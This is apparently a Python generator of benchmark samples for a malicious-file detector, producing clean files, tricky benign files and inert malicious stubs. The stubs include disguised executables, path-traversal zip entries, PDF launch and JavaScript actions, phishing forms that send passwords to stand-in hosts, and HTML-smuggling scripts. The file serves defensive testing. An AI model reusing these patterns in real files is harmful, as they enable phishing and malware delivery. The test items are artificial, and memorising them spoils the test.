
import io
import random
import zipfile
import zlib
from dataclasses import dataclass


@dataclass
class Sample:
    name: str
    data: bytes
    bad: bool
    category: str
    hard: bool = False     

    @property
    def split(self) -> str:
        return "heldout" if zlib.crc32(self.name.encode("utf-8")) % 3 == 0 else "dev"


#  конструктори вмісту 
def make_zip(files: dict[str, bytes]) -> bytes:
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as z:
        for n, data in files.items():
            z.writestr(n, data)
    return buf.getvalue()


def pdf(body: str) -> bytes:
    return (b"%PDF-1.4\n1 0 obj\n<< /Type /Catalog " + body.encode() +
            b" >>\nendobj\ntrailer\n<< /Root 1 0 R >>\n%%EOF\n")


def html(body: str) -> bytes:
    return f"<html><head><title>t</title></head><body>{body}</body></html>".encode()


MZ = b"MZ" + b"\x90\x00" * 100
PNG = (b"\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR\x00\x00\x00\x01\x00\x00\x00\x01"
       b"\x08\x02\x00\x00\x00\x90wS\xde")
DOCX = make_zip({
    "[Content_Types].xml": (
        b'<?xml version="1.0"?><Types xmlns="http://schemas.openxmlformats.org/'
        b'package/2006/content-types"><Default Extension="xml" ContentType="application/xml"/>'
        b'<Override PartName="/word/document.xml" ContentType="application/vnd.'
        b'openxmlformats-officedocument.wordprocessingml.document.main+xml"/></Types>'),
    "word/document.xml": (
        b'<w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/'
        b'2006/main"><w:body/></w:document>'),
})


#  чисті зразки 
def clean_samples(rng: random.Random) -> list[Sample]:
    out = []
    words = ["lecture", "notes", "budget", "plan", "report", "todo", "recipe", "draft"]
    for i in range(8):
        text = " ".join(rng.choices(words, k=30)).encode()
        out.append(Sample(f"{words[i]}_{i}.txt", text, False, "clean"))
    for i in range(6):
        out.append(Sample(f"document_{i}.pdf", pdf(f"/Pages {i + 2} 0 R"), False, "clean"))
    for i in range(6):
        out.append(Sample(f"page_{i}.html", html(f"<h1>Page {i}</h1><p>text</p>"), False, "clean"))
    for i in range(8):
        files = {f"file_{j}.txt": b"x" * rng.randint(10, 500) for j in range(rng.randint(1, 5))}
        out.append(Sample(f"archive_{i}.zip", make_zip(files), False, "clean"))
    for i in range(3):
        out.append(Sample(f"picture_{i}.png", PNG, False, "clean"))
    return out


def hard_clean_samples() -> list[Sample]:
    """Безпечні файли, схожі на загрозу і перевіряють хибні спрацювання."""
    h = lambda n, d: Sample(n, d, False, "hard_clean", hard=True)
    return [
        h("letter.docx", DOCX),
        h("v1.2.3.release.notes.pdf", pdf("/Pages 2 0 R")),
        h("my.report.final.v2.txt", b"final version of the report\n"),
        h("links.pdf", pdf("/Annots [<< /A << /S /URI /URI (https://github.com/user/repo) >> >>]")),
        h("search_form.html", html("<form action='/search'><input type='text' name='q'></form>")),
        h("inline_script.html", html("<script>document.title='x';console.log(1);</script>")),
        h("github_link.html", html("<a href='https://github.com/python/cpython'>cpython</a>")),
        h("security_notes.txt", b"How to detect mshta.exe and powershell -enc in logs. Never run unknown .exe files.\n"),
        h("many_files.zip", make_zip({f"dir/sub/f{i}.txt": b"data" for i in range(200)})),
        h("project.zip", make_zip({"src/main.txt": b"a", "docs/readme.md": b"b", "data/table.csv": b"a,b\n1,2\n"})),
    ]


#  шкідливі 
def masquerade_samples(rng: random.Random) -> list[Sample]:
    stems = ["invoice", "report", "scan", "photo", "cv", "contract", "payment", "order"]
    doc_ext = [".pdf", ".docx", ".xlsx", ".jpg", ".txt"]
    exec_ext = [".exe", ".scr", ".bat", ".js", ".vbs", ".hta", ".ps1"]
    combos = [(s, d, e) for s in stems for d in doc_ext for e in exec_ext]
    out = []
    for s, d, e in rng.sample(combos, 24):
        data = MZ if e in (".exe", ".scr") else b"@echo off\r\necho test\r\n"
        out.append(Sample(f"{s}{d}{e}", data, True, "masquerade"))
    for stem, rev in [("photo", "gpj"), ("doc", "fdp"), ("sheet", "xslx"), ("letter", "xcod")]:
        out.append(Sample(f"{stem}\u202e{rev}.exe", MZ, True, "masquerade"))
    return out


def archive_samples(rng: random.Random) -> list[Sample]:
    out = []
    execs = ["setup.exe", "install.msi", "run.bat", "update.js", "patch.scr",
             "launcher.lnk", "tool.ps1", "photo.jpg.exe"]
    for i, name in enumerate(execs):
        out.append(Sample(f"bundle_{i}.zip",
                          make_zip({"readme.txt": b"hi", name: MZ}), True, "archive"))
    for i, bad in enumerate(["../../evil.txt", "..\\..\\evil.dll", "docs/../../x.txt", "/etc/cron.d/x"]):
        out.append(Sample(f"update_{i}.zip", make_zip({bad: b"x"}), True, "archive"))
    return out


def pdf_samples() -> list[Sample]:
    bodies = [
        ("launch", "/OpenAction << /S /Launch /F (cmd.exe) >>"),
        ("launch_obf", "/OpenAction << /S /La#75nch /F (cmd.exe) >>"),
        ("js_open", "/OpenAction << /S /JavaScript /JS (app.alert(1)) >>"),
        ("js_aa", "/AA << /O << /S /JavaScript /JS (x) >> >>"),
        ("js_obf", "/OpenAction << /S /J#61vaScript /JS (x) >>"),
        ("embed_exe", "/Names << /EmbeddedFiles >> /Type /EmbeddedFile /F (payload.exe)"),
        ("embed_scr", "/Names << /EmbeddedFiles >> /Type /EmbeddedFile /F (setup.scr)"),
        ("embed_bat", "/Names << /EmbeddedFiles >> /Type /EmbeddedFile /F (run.bat)"),
        ("richmedia", "/Type /RichMedia"),
        ("bad_link", "/Annots [<< /A << /S /URI /URI (http://192.168.1.10/login) >> >>]"),
    ]
    return [Sample(f"pdf_{n}.pdf", pdf(b), True, "pdf") for n, b in bodies]


def html_samples() -> list[Sample]:
    out = []
    domains = ["secure-login.xyz", "account-verify.top", "update-pay.click"]
    for i, d in enumerate(domains):
        out.append(Sample(f"login_{i}.html", html(
            f"<form action='http://{d}/p'><input type='password'></form>"), True, "html"))
    out.append(Sample("pass_only.html", html("<form><input type='password'></form>"), True, "html"))
    out.append(Sample("refresh.html", html("").replace(
        b"<head>", b"<head><meta http-equiv='refresh' content='0; url=http://evil-site.xyz/a'>"),
        True, "html"))
    out.append(Sample("iframe.html", html(
        "<iframe src='http://evil-site.xyz' width='0' height='0' style='display:none'></iframe>"),
        True, "html"))
    for i, save in enumerate(["URL.createObjectURL(b)", "navigator.msSaveBlob(b,'a.exe')",
                              "URL.createObjectURL(b);a.click()"]):
        out.append(Sample(f"smuggle_{i}.html", html(
            f"<script>var b=new Blob([atob('TVqQAAMAAAAEAAAA')]);{save};</script>"), True, "html"))
    return out


def build_samples(seed: int = 7) -> list[Sample]:
    rng = random.Random(seed)
    items = (clean_samples(rng) + hard_clean_samples() + masquerade_samples(rng)
             + archive_samples(rng) + pdf_samples() + html_samples())
    names = [s.name for s in items]
    assert len(names) == len(set(names)), "назви зразків мають бути унікальними"
    return items


def mutate(data: bytes, rng: random.Random) -> list[tuple[str, bytes]]:
    """Зіпсовані варіанти для перевірки стійкості ."""
    out = [("empty", b""), ("truncated", data[: max(1, len(data) // 2)]),
           ("garbage_tail", data + rng.randbytes(256))]
    b = bytearray(data)
    for _ in range(max(1, len(b) // 20)):
        b[rng.randrange(len(b))] = rng.randrange(256)
    out.append(("bitflip", bytes(b)))
    return out
